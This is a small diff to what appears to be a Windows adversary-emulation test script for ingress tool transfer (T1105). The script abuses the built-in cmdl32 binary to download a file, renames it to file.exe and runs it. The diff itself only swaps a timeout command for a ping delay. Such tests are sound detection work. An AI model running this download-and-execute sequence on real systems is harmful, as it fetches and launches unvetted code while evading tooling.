@@ -11,6 +11,6 @@ cmdl32 /vpn /lan %temp%\T1105\setting.txt
 icacls %temp%\T1105 /remove:d %username%
 move %temp%\T1105\*.tmp %temp%\T1105\file.exe
 %temp%\T1105\file.exe
-timeout /T 10
+ping -n 10 127.0.0.1 >nul 2>&1
 Taskkill /IM notepad.exe /F
 Taskkill /IM Calculator.exe /F
